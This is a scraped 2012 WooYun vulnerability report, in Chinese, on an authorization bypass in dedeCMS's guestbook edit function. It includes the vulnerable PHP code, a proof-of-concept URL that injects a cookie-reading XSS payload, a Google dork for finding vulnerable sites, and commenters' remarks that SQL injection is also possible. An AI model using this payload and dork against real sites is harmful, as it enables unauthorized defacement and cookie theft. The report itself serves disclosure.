{"id": 16437, "wybug_id": "wooyun-2012-014501", "wybug_title": "dedeCMS权限绕过导致跨站攻击", "wybug_corp": "DEDECMS", "wybug_author": "路过的菜鸟A", "wybug_date": "2012-11-08 12:28", "wybug_open_date": "2012-11-08 12:28", "wybug_type": "非授权访问/权限绕过", "wybug_level": "中", "wybug_rank_0": "10", "wybug_status": "未联系到厂商或者厂商积极忽略", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2012-11-08：\t积极联系厂商并且等待厂商认领中，细节不对外公开\t\t\t\t\t\t\t\t\t2012-11-08：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： dedeCMS某处由于权限绕过可导致跨站脚本攻击 详细说明：  首先是/plus/guestbook.php\n\naction=admin然后来到/guestbook/edit.inc.php\n\n\nelse if($job=='editok')//这里没有判断$g_isadmin{\t$remsg = trim($remsg);略\t$dsql->ExecuteNoneQuery(\"update `#@__guestbook` set `msg`='$msg', `posttime`='\".time().\"' where id='$id' \");//而这里没有过滤,可以写代码了……\tShowMsg(\"成功更改或回复一条留言！\",$GUEST_BOOK_POS);\texit();}\n   漏洞证明：  http://www.xxx.com/plus/guestbook.php?action=admin&job=editok&id=100&msg=<body onload=alert(document.cookie)>这个id,可以在[回复/编辑]这个按钮处看到仔细试试没准还能试出注入呢。。。。google直接:inurl:/plus/guestbook.php，还是有不少的\n\n\n\n\n\n   修复方案：  权限啊，过滤啊，自己看着办吧   版权声明：转载请注明来源 路过的菜鸟A@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 未能联系到厂商或者厂商积极拒绝  ", "replys": "漏洞评价：\n评论\n     2012-11-08 16:44 |    \t\twhking \t\t\t( 路人 |\t\t\t        Rank:14 漏洞数:4        | 诚实守信，与人为善！)\t\t \n  哈哈，喜欢dedecms的漏洞，秒开啊！到哪里找这么给力的厂商啊！    \n     2012-11-08 16:47 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @whking 联系不上，以前的基本都是忽略了    \n     2012-11-10 03:31 |    \t\tB1n4ry \t\t\t( 实习白帽子  |\t\t\t        Rank:55 漏洞数:6        )\t\t \n  这地方确实有注入额·· 只是利用起来稍微麻烦了点。    \n     2012-11-12 11:29 |    \t\t疯狗  \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:2        | 阅尽天下漏洞，心中自然无码。)\t\t \n  @B1n4ry wooyun啊~    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}